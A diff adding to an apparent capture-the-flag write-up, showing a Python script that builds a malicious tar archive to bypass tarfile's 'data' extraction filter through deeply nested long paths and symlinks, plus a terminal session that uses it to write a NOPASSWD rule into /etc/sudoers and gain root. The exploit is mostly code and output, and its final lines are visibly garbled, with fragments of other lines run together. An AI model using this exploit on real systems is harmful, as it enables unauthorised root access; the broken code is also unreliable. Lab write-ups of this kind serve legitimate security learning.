@@ -302,5 +302,76 @@ Meaning:
 - You control arguments
 
 ```
+wacky@wingdata:/tmp$ cat > /tmp/exploit_cve.py << 'EOF'
+import tarfile
+import os
+import io
+
+# The payload we want to drop into /etc/sudoers
+PAYLOAD = b"wacky ALL=(ALL) NOPASSWD: ALL\n"
+TAR_NAME = "/tmp/backup_9999.tar"
+
+with tarfile.open(TAR_NAME, mode="w") as tar:
+
+    # ---------------------------------------------------------
+    # STAGE 1: The PATH_MAX Setup
+    # ---------------------------------------------------------
+    # Linux has a maximum path length (PATH_MAX) of 4096 characters.
+    # Python's 'data' filter uses os.path.realpath() to check if a file
+    # is safe. We are going to build a directory path so long that it
+    # causes realpath() to fail or truncate, confusing the security check.
+
+    long_folder = 'd' * 247  # A very long folder name
+    steps = "abcdefghijklmnop" # 16 steps of nesting
+    current_path = ""
+
+    # Build a deeply nested directory structure: /dddd.../dddd.../
+    for char in steps:
+        # 1. Create the deep directory
+        dir_info = tarfile.TarInfo(os.path.join(current_path, long_folder))
+        dir_info.type = tarfile.DIRTYPE
+        tar.addfile(dir_info)
+
+        # 2. Create a symlink at each step to make the path complex
+        sym_info = tarfile.TarInfo(os.path.join(current_path, char))
+        sym_info.type = tarfile.SYMTYPE
+        sym_info.linkname = long_folder
+        tar.addfile(sym_info)
+
+        # Move deeper into the directory structure
+        current_path = os.path.join(current_path, long_folder)
+
+    # ---------------------------------------------------------
+    # STAGE 2: The Escape Hatch (The Bypass)
+    # ---------------------------------------------------------
+    # Now we are deep inside the folders. We create a symlink with a
+    # massive name ("l" * 254) that points all the way back up ("../").
+    # When os.path.realpath() tries to resolve this entire chain, it
+    # exceeds limits and bugs out, bypassing the 'data' filter.
+
+    deep_link_path = os.path.join("/".join(steps), "l" * 254)
+    deep_link = tarfile.TarInfo(deep_link_path)
+EOFnt("[+] Exploit tarball generated at: " + TAR_NAME)AD))'/etc/sudoers'./sudoers'.
+```
 
 ```
+wacky@wingdata:/tmp$ python3 exploit_cve.py
+[+] Exploit tarball generated at: /tmp/backup_9999.tar
+
+wacky@wingdata:/tmp$ mv /tmp/backup_9999.tar /opt/backup_clients/backups/
+
+wacky@wingdata:/tmp$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_test
+[+] Backup: backup_9999.tar
+[+] Staging directory: /opt/backup_clients/restored_backups/restore_test
+[+] Extraction completed in /opt/backup_clients/restored_backups/restore_test
+
+wacky@wingdata:/tmp$ sudo -l
+User wacky may run the following commands on wingdata:
+    (ALL) NOPASSWD: ALL
+    
+wacky@wingdata:/tmp$ sudo su
+root@wingdata:/tmp# cd /root/
+root@wingdata:~# cat root.txt
+3faff208f8661c94ca9e6a220f239daa
+```
+
